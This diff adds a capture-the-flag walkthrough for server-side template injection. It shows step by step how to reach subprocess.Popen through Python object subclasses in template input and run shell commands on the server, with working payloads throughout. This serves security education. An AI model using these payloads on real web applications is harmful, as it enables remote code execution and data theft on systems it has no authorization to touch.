@@ -1,0 +1,74 @@
+In SSTI You Can Use Template Tags And Commands That Are Available In Web Frameworks.
+
+In Real Life Tests, If You Want To Test This Bug, Its Common That You Write This :
+
+```
+{{5 + 5}}
+```
+
+And If It Returns 10, Then You Can Use This Bug.
+
+In This Challenge You Must Get RCE ( Remote Code Execution ) To Get Flag. After Getting That Just
+See Code And Get The Flag.
+
+Run app.py To Run Server. After That,
+Time To Open Your Interpreter :)
+
+Run This Lines And Get Results Line By Line : 
+
+```
+* "".__class__ # Get Class (str)
+
+* "".__class__.__base__ # Get Base (object)
+
+* "".__class__.__base__.__subclasses__() # Get All Subclasses (list). Contains Something Fore RCE ! Like subprocess module...
+```
+
+Now After You See The Results, Enter Last One In /welcome route Like :
+
+```
+{{ "".__class__.__base__.__subclasses__() }}
+```
+
+Now You Will Get All The Subclasses Function. Search For "subprocess.popen" And You Will Find It.
+
+Time To Play With Numbers And Find Index Of subprocess.popen, You Ask How ?
+
+Like This :
+
+```
+{{ "".__class__.__base__.__subclasses__()[100:] }}
+```
+
+And Search If "popen" is there. Play With Numbers Until You Find Index. For Example I Found It At 304.
+
+After That Tries To Run This :
+
+```
+{{ "".__class__.__base__.__subclasses__()[304]("ls") }}
+```
+
+As You See, There Is Internal Server Error. Thats Just For Function Itself. To Prevent This : 
+
+```
+{{ "".__class__.__base__.__subclasses__()[304]("ls",shell=True,stdout=-1).communicate() }}
+```
+
+After That You Can Put Anything On 'ls' Command.
+
+Now You Can Write Exploit If You Can To Run Any Command On Server !
+Its Time To Get Flag !
+
+Just You Must Run This Code On Server : 
+
+```
+cat app.py 
+```
+
+So, Run This : 
+
+```
+{{ "".__class__.__base__.__subclasses__()[304]("cat app.py",shell=True,stdout=-1).communicate() }}
+```
+
+And You Got The Code, Flag Is In Code !
